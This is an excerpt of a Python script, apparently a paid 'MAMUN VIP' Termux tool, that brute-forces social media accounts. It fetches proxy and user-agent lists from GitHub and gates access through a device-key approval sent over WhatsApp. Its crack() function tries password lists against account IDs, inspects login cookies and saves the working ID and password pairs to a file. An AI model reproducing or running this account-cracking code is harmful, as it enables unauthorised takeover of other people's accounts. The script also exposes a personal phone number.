...
time.sleep(2)
os.system(f'xdg-open https://www.youtube.com/@MdManik-rv6xm')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100081325148181')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/habiba404/BDMC/blob/main/.prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/habiba404/File/blob/main/Aptoval.txt').text
        ua=open('bbnew.txt','w')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMAMUN-BRO ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • LX MAMUN CHOWDHURY        ║  \033[1;97m  
╠══[Github                   • \33[1;38mHABIBA-404 ║\33[1;34m   
╠══[Whatsapp                 • 01726033714    ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/habiba404/Mamun-bd/blob/main/approub.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801726033714?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("MAMUN-BD.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  MAMUN,  V I P,  Tools"')
def back():
	login()
...
#while attemps < 12345677901:
  ...
  #  password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')
   ...
   # if username == 'MAMUN' and password == 'HABIBA':
...
def menu():
    ...
    if WASIM in ['111']:
        ...
        os.system('xdg-open https://github.com/habiba404')
        os.system("python MAMUN-BD.py")
    elif WASIM in ['3','03']:
        result()
    elif WASIM in ['0']:
...
def crack_file():
    ...
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mPUT FILE NAME EXAMPLE: /sdcard/MAMUN-BD.txt Etc.]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[MAMUN-BD-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MAMUN-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " MAMUN,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
